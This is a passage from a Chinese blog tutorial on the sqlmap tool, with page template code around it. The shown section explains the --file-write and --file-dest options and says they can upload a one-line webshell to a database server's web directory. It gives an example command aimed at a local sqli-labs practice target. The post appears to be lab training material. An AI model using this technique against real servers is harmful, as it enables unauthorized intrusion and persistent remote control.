+<li><h4 id="上传⽂件到数据库服务器中-—file-write-—file-dest"><a href="#上传⽂件到数据库服务器中-—file-write-—file-dest" class="headerlink" title="上传⽂件到数据库服务器中(—file-write —file-dest)"></a>上传⽂件到数据库服务器中(—file-write —file-dest)</h4><p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写⼊)，并且当前⽤户有权 限向任意⽬录写⽂件的时候，可以上传⽂件到数据库服务器。⽂件可以是⽂本，也可以是⼆ 进制⽂件。 所以利⽤上传⽂件，我们可以上传⼀句话⽊⻢或者上传shell上去。 前提是我们知道⽹络的绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 sqlmap.py -u http://192.168.10.130/sqli-labs/Less-2/?<span class="hljs-built_in">id</span>=1 --file-write C:\Users\mi\Desktop\1.php --file-dest <span class="hljs-string">&quot;C:\phpStudy\PHPTutorial\WWW\2.php&quot;</span> <span class="hljs-comment">#将本地的C:\Users\mi\Desktop\1.php⽂件上传到⽬标服务器C:\phpStudy\PHPTutorial\WWW\2.php</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="../../../../../categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="category-chain-item">工具使用</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="../../../../../tags/sqlmap/">#sqlmap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqlmap使用</div>
+      <div>http://idea-oss.github.io/2024/01/08/sqlmap使用/sqlmap使用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>iDea</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月8日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="../../php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/" title="php ctf代码审计题">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php ctf代码审计题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="../../../07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="sql注入靶场练习">
+                        <span class="hidden-mobile">sql注入靶场练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.18/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0mPxzRPwogk31Fn10hTPyb1K-gzGzoHsz","appKey":"BUzND1EWjf6LGVsgj979UcGb","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://0mpxzrpw.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":null},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>可乐</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>不乐</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  
+    <script  src="../../../../../js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="../../../../../js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="../../../../../js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
